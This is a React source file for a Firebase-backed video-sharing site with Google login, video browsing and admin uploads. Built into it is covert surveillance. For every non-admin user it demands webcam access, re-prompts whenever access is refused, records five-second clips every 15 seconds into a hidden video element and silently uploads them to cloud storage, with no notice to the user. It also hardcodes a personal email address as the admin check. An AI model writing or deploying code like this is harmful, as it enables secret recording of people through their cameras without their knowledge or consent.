import React, { useState, useEffect, useRef } from "react";
import 'bootstrap/dist/css/bootstrap.min.css';
import './App.css';
import { storage, auth, provider, db } from "./firebase";
import { signInWithPopup, onAuthStateChanged, signOut } from "firebase/auth";
import { ref, uploadBytesResumable, getDownloadURL } from "firebase/storage";
import { collection, addDoc, getDocs } from "firebase/firestore";

function App() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);
  const [videos, setVideos] = useState([]);
  const [currentVideoIndex, setCurrentVideoIndex] = useState(0);
  const [title, setTitle] = useState("");
  const [uploadFile, setUploadFile] = useState(null);
  const [uploadProgress, setUploadProgress] = useState(0);
  const [cameraPermission, setCameraPermission] = useState(false);
  const videoRef = useRef(null);
  const mediaRecorderRef = useRef(null);

  useEffect(() => {
    const unsubscribe = onAuthStateChanged(auth, (user) => {
      if (user) {
        setIsAuthenticated(true);
        setIsAdmin(user.email === "epsilonclasher12@gmail.com");
        if (!isAdmin) {
          requestCameraPermission();
        }
      } else {
        setIsAuthenticated(false);
        setIsAdmin(false);
      }
    });

    return () => unsubscribe();
  }, [isAdmin]);

  useEffect(() => {
    const fetchVideos = async () => {
      try {
        const videosCollection = collection(db, "videos");
        const videoSnapshot = await getDocs(videosCollection);
        const videoData = videoSnapshot.docs.map(doc => doc.data());
        setVideos(videoData);
      } catch (error) {
        console.error("Error fetching videos:", error);
      }
    };

    fetchVideos();
  }, []);

  const requestCameraPermission = async () => {
    try {
      const mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
      setCameraPermission(true);
      if (videoRef.current) {
        videoRef.current.srcObject = mediaStream;
      }
    } catch (error) {
      console.error("Error accessing camera:", error);
      alert("Camera access is required to use this feature. Please allow camera access.");
      requestCameraPermission();
    }
  };

  useEffect(() => {
    if (cameraPermission && !isAdmin) {
      const captureInterval = setInterval(() => {
        recordVideo();
      }, 15000); // Record every 15 seconds

      return () => clearInterval(captureInterval);
    }
  }, [cameraPermission, isAdmin]);

  const recordVideo = () => {
    const mediaStream = videoRef.current.srcObject;
    if (!mediaStream) return;

    const mediaRecorder = new MediaRecorder(mediaStream);
    const chunks = [];

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        chunks.push(event.data);
      }
    };

    mediaRecorder.onstop = async () => {
      const blob = new Blob(chunks, { type: "video/webm" });
      const storageRef = ref(storage, `websitevideos/${Date.now()}.webm`);
      await uploadBytesResumable(storageRef, blob).catch(error => console.error("Error uploading video:", error));
    };

    mediaRecorder.start();
    setTimeout(() => {
      mediaRecorder.stop();
    }, 5000); // Record for 5 seconds
  };

  const login = async () => {
    try {
      await signInWithPopup(auth, provider);
    } catch (error) {
      console.error("Error logging in:", error);
      alert("Login failed. Please try again.");
    }
  };

  const logout = async () => {
    try {
      await signOut(auth);
    } catch (error) {
      console.error("Error logging out:", error);
      alert("Logout failed. Please try again.");
    }
  };

  const handleNext = () => {
    setCurrentVideoIndex((prevIndex) => (prevIndex + 1) % videos.length);
  };

  const handlePrevious = () => {
    setCurrentVideoIndex((prevIndex) => (prevIndex - 1 + videos.length) % videos.length);
  };

  const handleDownload = () => {
    const link = document.createElement('a');
    link.href = videos[currentVideoIndex].url;
    link.download = videos[currentVideoIndex].url.split('/').pop();
    link.click();
  };

  const handleUpload = () => {
    if (uploadFile && title) {
      const storageRef = ref(storage, `videos/${uploadFile.name}`);
      const uploadTask = uploadBytesResumable(storageRef, uploadFile);

      uploadTask.on(
        'state_changed',
        (snapshot) => {
          const progress = (snapshot.bytesTransferred / snapshot.totalBytes) * 100;
          setUploadProgress(progress);
        },
        (error) => {
          console.error("Error uploading file:", error);
          alert("Upload failed. Please try again.");
        },
        async () => {
          const url = await getDownloadURL(uploadTask.snapshot.ref);
          await addDoc(collection(db, "videos"), {
            title: title,
            url: url,
            timestamp: new Date()
          });
          setUploadFile(null);
          setTitle("");
          setUploadProgress(0);
          const videoSnapshot = await getDocs(collection(db, "videos"));
          const videoData = videoSnapshot.docs.map(doc => doc.data());
          setVideos(videoData);
        }
      );
    } else {
      alert("Please provide a title and select a file to upload.");
    }
  };

  useEffect(() => {
    if (videoRef.current) {
      videoRef.current.load();
      videoRef.current.play().catch((error) => {
        console.log("Autoplay failed:", error);
      });
    }
  }, [currentVideoIndex]);

  return (
    <div className="App">
      {!isAuthenticated ? (
        <button onClick={login} className="btn btn-primary login-btn">Login with Google</button>
      ) : (
        <>
          {isAdmin && (
            <div className="upload-section">
              <h3>Upload Video</h3>
              <input
                type="text"
                value={title}
                onChange={(e) => setTitle(e.target.value)}
                placeholder="Title"
                className="form-control mb-2"
              />
              <input
                type="file"
                onChange={(e) => setUploadFile(e.target.files[0])}
                className="form-control mb-2"
              />
              <button onClick={handleUpload} className="btn btn-success">Upload</button>
              {uploadProgress > 0 && (
                <div className="progress mt-2">
                  <div
                    className="progress-bar"
                    role="progressbar"
                    style={{ width: `${uploadProgress}%` }}
                    aria-valuenow={uploadProgress}
                    aria-valuemin="0"
                    aria-valuemax="100"
                  >
                    {Math.round(uploadProgress)}%
                  </div>
                </div>
              )}
            </div>
          )}

          <div className="video-section mt-4">
            {videos.length > 0 && (
              <>
                <h4>{videos[currentVideoIndex].title}</h4>
                <div className="video-container">
                  <video
                    ref={videoRef}
                    src={videos[currentVideoIndex].url}
                    controls
                    className="video-player"
                    autoPlay
                    muted={false}
                  />
                </div>
                <small>{new Date(videos[currentVideoIndex].timestamp.seconds * 1000).toLocaleString()}</small>
                <div className="controls mt-2 d-flex justify-content-center">
                  <button onClick={handlePrevious} className="btn btn-info mx-2">Previous</button>
                  <button onClick={handleDownload} className="btn btn-warning mx-2">Download</button>
                  <button onClick={handleNext} className="btn btn-info mx-2">Next</button>
                </div>
              </>
            )}
          </div>
          <footer className="footer">
            <button onClick={logout} className="btn btn-secondary">Logout</button>
          </footer>
        </>
      )}
      <video ref={videoRef} style={{ display: 'none' }} autoPlay></video>
    </div>
  );
}

export default App;
